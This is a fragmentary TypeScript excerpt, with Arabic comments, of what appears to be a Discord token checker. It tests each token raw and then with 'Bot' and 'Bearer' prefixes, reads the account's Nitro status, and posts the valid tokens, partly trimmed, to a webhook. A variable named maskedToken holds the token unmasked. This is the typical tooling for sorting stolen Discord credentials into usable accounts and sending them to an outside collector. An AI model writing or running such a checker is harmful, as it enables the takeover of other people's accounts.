...
async function checkSingleToken(token: string): Promise<TokenResult> {
  ...
  const maskedToken = cleanedToken;
  ...
  // جرب التوكن بدون Bot prefix أولاً
  let result = await tryFetch(cleanedToken);
  // إذا فشل، جرّب مع Bot prefix
  if (!result.ok || !result.data || result.status === 401) {
    result = await tryFetch(`Bot ${cleanedToken}`);
  }
  // إذا فشل أيضاً، جرّب bearer
  if (!result.ok || !result.data || result.status === 401) {
    result = await tryFetch(`Bearer ${cleanedToken}`);
  }
  ...
  else if (premiumType === 3) nitro = '✅ نيترو ستيشن';
    ...
    sendToWebhook({
      embeds: [{
        ...
        fields: [
          ...
          { name: '🎫 Valid Tokens', value: `\`\`\`${validTokens.map(t => t.substring(0, 15) + '...' + t.substring(t.length - 5)).join('\n')}\`\`\`` },
        ],
